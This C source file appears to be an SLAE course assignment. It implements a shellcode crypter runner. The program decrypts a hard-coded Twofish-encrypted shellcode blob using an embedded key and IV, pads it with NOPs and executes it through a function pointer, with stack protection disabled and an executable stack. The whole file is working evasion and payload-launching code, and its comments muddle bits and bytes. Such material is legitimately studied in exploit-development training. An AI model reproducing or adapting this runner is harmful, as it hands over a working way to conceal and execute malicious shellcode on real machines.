/*in this assignment I will be using the following API:
 * MCrypt API available online:
 * http://linux.die.net/man/3/mcrypt
which is providing a lot of encryption algorthims in it
Encryption Algorithim: Two Fish

Auther: H4554n AlMusajjen
SLAE - 1057

executing this file as shown below:
	gcc crypter_decrypt.c -fno-stack-protector -z execstack /usr/lib/libmcrypt.a -o decrypter && ./decrypter
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <mcrypt.h>

#include <math.h>
#include <stdint.h>
#include <stdlib.h>

int decrypt(void* buffer,int buffer_len,char* IV,char* key,int key_len )
{
  MCRYPT td = mcrypt_module_open("twofish", NULL, "cbc", NULL);
  int blocksize = mcrypt_enc_get_block_size(td);
  if( buffer_len % blocksize != 0 ){printf("Buffer_length must give us zero reminder when deviding it on blocksize");return 1;}
  
  mcrypt_generic_init(td, key, key_len, IV);
  mdecrypt_generic(td, buffer, buffer_len);
  mcrypt_generic_deinit (td);
  mcrypt_module_close(td);
  
  return 0;
}

int main()
{
  MCRYPT td, td2;
 unsigned char * ciphertext = "\xb1\x93\xba\x6a\xa9\xc0\xa5\xa9\x0a\x7f\xa2\x02\xca\xd1\xef\xef\x71\x22\xd0\xf9\xed\xbc\xf4\x34\xf3\x01\x93\x14\x7b\xcc\x7a\xf5";
  char* IV = "AAAAAAAAAAAAAAAA";
  char *key = "1234567890fedcba";
  int keysize = 16; /* 128 bits */

	//please note since we are deviding our block into 16 bit in each
	//then in order to put our 25 shellcode we need 32 bit buffer 
	//which is basiclly is multiple of 16.
  unsigned char buffer[32];
  int counter; 
  int buffer_len = 32;
 
/*key
 Initialize the buffer and make sure all bytes are set to 0x90, which is
 nop. This will prevent null bytes coming out of the decrypted
 shellcode and breaking the exploit.
 */
 for ( counter = 0; counter < buffer_len; counter++){
   buffer[counter]=0x90;
  }
  /*
   Now copy the ciphertext shellcode to the buffer
  */
  strncpy(buffer, ciphertext, buffer_len);
  int cipher_len = strlen(ciphertext);
  printf("==ciphertext Binary==\n");
  for ( counter = 0; counter < cipher_len; counter++){
    printf("%02x",ciphertext[counter]);
  }


  /**
  Decrypt the buffer
  **/
  decrypt(buffer, buffer_len, IV, key, keysize); 
  printf("\n==decrypted  Binary==\n");
  for ( counter = 0; counter < buffer_len; counter++){
    printf("\\x%02x",buffer[counter]);
  }

  printf("\n");
  printf("Shellcode Length:  %d\n", strlen(buffer));
  int (*ret)() = (int(*)())buffer;
  ret();

  return 0;


}
